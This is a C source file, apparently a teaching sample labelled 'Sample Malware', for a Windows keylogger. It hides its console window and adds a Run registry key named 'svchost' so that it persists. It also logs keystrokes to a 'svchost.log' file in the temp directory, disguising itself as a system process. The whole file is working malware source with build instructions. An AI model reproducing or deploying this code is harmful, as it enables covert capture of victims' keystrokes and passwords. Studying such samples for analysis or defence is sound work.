/*-------------------------------------------------------------------------------------------------
 *
 *      Sample Malware: Offline Keylogger
 *      Function      : Log keystrokes to a file in tmp directory
 * 
 *-----------------------------------------------------------------------------------------------
 *
 *		Best built in Visual Studio 10
 *          Porject settings (Configuration Properties):
 *				1. C/C++ --> Advanced --> Calling convention
 *				   Set __stdcall (Gz)
 *				2. Linker --> General --> Enable Incremental Linking
 *				   Set NO
 *				3. Linker --> System --> SubSystem
 *				   Set CONSOLE
 *
 *-----------------------------------------------------------------------------------------------*/

#include<windows.h>
#include<stdio.h>
#include<winuser.h>
#include<windowsx.h>

#pragma runtime_checks( "[runtime_checks]", off )
#define BUFSIZE 80

int test_key(void);
int create_key(char *);
int get_keys(void);

int main(void)
{
   HWND stealth; /*creating stealth (window is not visible)*/
   AllocConsole();
   stealth=FindWindowA("ConsoleWindowClass",NULL);
   ShowWindow(stealth,0);

   int test,create;
   test=test_key();/*check if key is available for opening*/

   if (test==2)/*create key*/
   {
       char *path="c:\\%windir%\\svchost.exe";/*the path in which the file needs to be*/
       create=create_key(path);

   }

   int t=get_keys();

   return t;
}  

int get_keys(void){
    short character;
    DWORD dwBytesWritten, dwPos;
    char file_name[100];
    GetTempPathA(100, file_name);
    strcat(file_name, "svchost.log");
    HANDLE logFile = CreateFileA(
                        file_name,
                        FILE_APPEND_DATA,                       // open for writing
                        FILE_SHARE_READ | FILE_SHARE_WRITE,     // allow multiple readers
                        NULL,                                   // no security
                        OPEN_ALWAYS,                            // open or create
                        FILE_ATTRIBUTE_NORMAL,                  // normal file
                        NULL);                                  // no attr. template
    if(logFile==NULL){
        return 0;
    }

    while(1) {
		Sleep(100);
		for (character=0x30; character<=0x5A; character++) {
            /* 0x30-0x39: 0 - 9
             * 0x41-0x5A: A - Z
             */
			if ((GetAsyncKeyState(character) & ((1<<15)||1))!=0) {
                SetFilePointer(
                            logFile,                                    // file name
                            0,                                          // offset
                            0,                                          // offset
                            FILE_END);                                  // offset reference point
                WriteFile(logFile, &character, 1, &dwBytesWritten, NULL);
                FlushFileBuffers(logFile);
                break;
			}
        }
        character = VK_SPACE;
        if ((GetAsyncKeyState(character) & ((1<<15)||1))!=0) {
            SetFilePointer(
                        logFile,                                    // file name
                        0,                                          // offset
                        0,                                          // offset
                        FILE_END);                                  // offset reference point
            WriteFile(logFile, &character, 1, &dwBytesWritten, NULL);
            FlushFileBuffers(logFile);
        }
    }
    CloseHandle(logFile);
    return EXIT_SUCCESS;
}                                                

int test_key(void)
{
    int check;
    HKEY hKey;
    char path[BUFSIZE];
    DWORD buf_length=BUFSIZE;
    int reg_key;

    reg_key=RegOpenKeyEx(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_QUERY_VALUE,&hKey);
    if(reg_key!=0)
    {    
        check=1;
        return check;
    }        

    reg_key=RegQueryValueEx(hKey,"svchost",NULL,NULL,(LPBYTE)path,&buf_length);

    if((reg_key!=0)||(buf_length>BUFSIZE))
        check=2;
    if(reg_key==0)
        check=0;

    RegCloseKey(hKey);
    return check;  
}

int create_key(char *path)
{  
       int reg_key,check;

       HKEY hkey;

       reg_key=RegCreateKey(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",&hkey);
       if(reg_key==0)
       {
               RegSetValueEx((HKEY)hkey,"svchost",0,REG_SZ,(BYTE *)path,strlen(path));
               check=0;
               return check;
       }
       if(reg_key!=0)
               check=1;

       return check;
}